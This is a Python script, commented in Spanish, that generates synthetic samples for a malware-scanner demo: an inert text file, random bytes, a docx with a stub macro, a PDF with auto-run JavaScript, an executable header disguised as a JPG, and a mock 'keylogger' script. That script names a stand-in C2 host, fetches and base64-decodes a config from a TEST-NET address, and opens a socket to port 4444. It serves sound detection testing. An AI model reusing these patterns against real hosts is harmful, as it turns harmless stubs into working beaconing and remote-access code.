"""Genera las muestras sintéticas del demo en samples/.

Son archivos inocuos: no descargan nada, no tocan el sistema y no contienen
malware real. Existen para que los motores tengan algo que detectar.
No se versionan (samples/ está en .gitignore).

Uso:
    python tools/make_samples.py
    python tools/make_samples.py --destino "C:/Users/tu_usuario/Downloads"
"""

import argparse
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

SCRIPT = '''"""Muestra de demostración. Inofensiva: los efectos son ecos en consola."""
import base64
import os
import socket
import urllib.request

C2 = "malware-demo.example"
URL = "http://198.51.100.7/panel/cfg.txt"  # TEST-NET-2, no enrutable


def descargar_config():
    datos = urllib.request.urlopen(URL, timeout=2).read()
    return base64.b64decode(datos)


def abrir_canal():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return s.connect((C2, 4444))


eval("print('demo')")
os.system("echo sentinel-demo")
'''

PDF = (
    b"%PDF-1.7\n"
    b"1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript"
    b" /JS (app.alert('demo')) >> >>\n"
    b"trailer << /Root 1 0 R >>\n%%EOF\n"
)

FAKE_JPG = b"MZ" + b"\x90" * 240 + b"SENTINEL-DEMO-NO-EXECUTABLE"


def w(path, data):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def make_docx(path):
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document/>")
        zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 256)
    return path


NOTES = """Nota de la reunión del lunes.
Revisar presupuesto, enviar el acta y reservar sala para el jueves.
"""


def generate(dest):
    """Escribe las muestras en dest y devuelve [(ruta, motor, qué debería verse)]."""
    dest = Path(dest)
    return [
        (w(dest / "notas_reunion.txt", NOTES.encode("utf-8")),
         "Binario", "texto normal: debe salir seguro"),
        (w(dest / "paquete_demo.bin", __import__("os").urandom(8192)),
         "Binario", "solo entropía alta: señal débil, seguro"),
        (make_docx(dest / "contrato_demo.docx"),
         "Office", "macro VBA sin más: revisar"),
        (w(dest / "demo_keylogger.py", SCRIPT.encode("utf-8")),
         "AST", "decodifica y ejecuta, socket + shell: peligro"),
        (w(dest / "factura_demo.pdf", PDF),
         "PDF", "JavaScript que se ejecuta al abrir: peligro"),
        (w(dest / "foto_demo.jpg", FAKE_JPG),
         "Binario", "ejecutable disfrazado de foto: peligro"),
    ]


def main():
    ap = argparse.ArgumentParser(description="Genera muestras sintéticas para el demo")
    ap.add_argument("--destino", default=str(ROOT / "samples"),
                    help="carpeta de salida (por defecto ./samples)")
    args = ap.parse_args()
    dest = Path(args.destino)

    files = generate(dest)

    print(f"\nMuestras generadas en {dest}\n" + "-" * 64)
    for path, engine, expected in files:
        print(f"{path.name:<24} {engine:<14} {expected}")
    print("-" * 64)
    print("Copia los archivos a tu carpeta de Descargas para verlos en la consola.")


if __name__ == "__main__":
    main()
